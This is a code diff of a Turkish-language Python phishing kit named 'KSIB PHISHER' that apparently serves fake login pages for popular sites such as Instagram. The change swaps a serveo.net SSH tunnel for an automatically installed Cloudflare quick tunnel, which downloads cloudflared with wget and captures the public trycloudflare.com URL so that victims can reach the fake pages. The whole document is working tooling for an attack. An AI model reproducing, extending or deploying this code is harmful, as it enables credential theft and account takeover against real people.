@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# KSIB PHISHER - iSH ICIN SON HAL (DNS KONTROLU KALDIRILDI)
-import os, sys, http.server, socketserver, time, json, random, uuid, threading, subprocess, socket
+# KSIB PHISHER - FULL OTOMATIK (iSH)
+import os, sys, http.server, socketserver, time, json, random, uuid, threading, subprocess, socket, re
 from http.cookies import SimpleCookie
 from urllib.parse import parse_qs, urlparse
 
@@ -261,23 +261,90 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         except: pass
     def log_message(self, *args): pass
 
-def serveo_tunnel(port, subdomain):
+# ============ OTOMATIK CLOUDFLARE KURULUMU ============
+def check_wget():
     try:
-        subprocess.Popen(
-            ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"{subdomain}:80:localhost:{port}", "serveo.net"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-        time.sleep(5)
-        return f"https://{subdomain}.serveo.net"
+        subprocess.run(["wget", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
     except:
+        return False
+
+def check_cloudflared():
+    try:
+        subprocess.run(["cloudflared", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except:
+        return False
+
+def install_cloudflared():
+    print("   📥 cloudflared indiriliyor...")
+    try:
+        # wget kontrol
+        if not check_wget():
+            print("   ❌ wget yok! iSH: apk add wget")
+            return False
+        
+        # indir
+        os.system("wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O /tmp/cloudflared 2>/dev/null")
+        if not os.path.exists("/tmp/cloudflared"):
+            print("   ❌ indirme basarisiz!")
+            return False
+        
+        os.system("chmod +x /tmp/cloudflared")
+        os.system("mv /tmp/cloudflared /usr/local/bin/cloudflared 2>/dev/null")
+        
+        if check_cloudflared():
+            print("   ✅ cloudflared kuruldu!")
+            return True
+        else:
+            print("   ❌ kurulum basarisiz!")
+            return False
+    except Exception as e:
+        print(f"   ❌ Hata: {e}")
+        return False
+
+def start_cloudflare_tunnel(port):
+    print("\n🌐 Cloudflare Tunnel baslatiliyor...")
+    
+    # cloudflared kontrol
+    if not check_cloudflared():
+        print("   ⚠️ cloudflared bulunamadi, kuruluyor...")
+        if not install_cloudflared():
+            return None
+    else:
+        print("   ✅ cloudflared hazir")
+    
+    try:
+        # Tüneli başlat
+        proc = subprocess.Popen(
+            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        print("   ⏳ Baglanti bekleniyor...")
+        for i in range(20):
+            time.sleep(1)
+            output = proc.stderr.readline()
+            if output:
+                if "trycloudflare.com" in output:
+                    match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', output)
+                    if match:
+                        return match.group(0)
+                if "ERR" in output or "error" in output.lower():
+                    print(f"   ⚠️ {output.strip()[:80]}")
+        return None
+    except Exception as e:
+        print(f"   ❌ Hata: {e}")
         return None
 
 def main():
     os.system('clear')
     print("""╔══════════════════════════════════╗
-║   🎣 KSIB PHISHER - iSH       ║
-║   SON SURUM                    ║
+║   🎣 KSIB PHISHER - OTOMATIK  ║
+║   Cloudflare Tunnel           ║
+║   iSH Destekli                ║
 ╚══════════════════════════════════╝""")
     for i in range(3):
         if input("Sifre: ") == PASSWORD: break
@@ -288,14 +355,6 @@ def main():
     for i,k in enumerate(keys,1): print(f"  [{i}] {SITES[k][0]}")
     try: sec = int(input("\n> ")); Handler.site = keys[sec-1] if 1<=sec<=len(keys) else "instagram"
     except: pass
-
-    print(f"\n🌐 SUBDOMAIN (.serveo.net):")
-    subdomain = input("   Subdomain: ").strip().lower()
-    while not subdomain:
-        print("   ❌ Bos olamaz!")
-        subdomain = input("   Subdomain: ").strip().lower()
-    Handler.subdomain = subdomain
-    print(f"   ✅ {subdomain}.serveo.net secildi.")
 
     custom = input(f"\n🔗 Ozel yol (bos = standart): ").strip()
     Handler.custom_path = custom if custom else ""
@@ -309,12 +368,12 @@ def main():
             break
         except OSError: print(f"❌ Port {port} kullaniliyor!"); continue
 
-    print(f"\n🌐 Tunnel baslatiliyor: {Handler.subdomain}.serveo.net...")
-    tunnel_url = serveo_tunnel(port, Handler.subdomain)
+    # Tunnel başlat
+    tunnel_url = start_cloudflare_tunnel(port)
 
     if not tunnel_url:
         print("\n❌ TUNEL BASARISIZ!")
-        print("   iSH: apk add openssh-client")
+        print("   iSH: apk add wget")
         print("   Tekrar dene.")
         sys.exit(1)
 
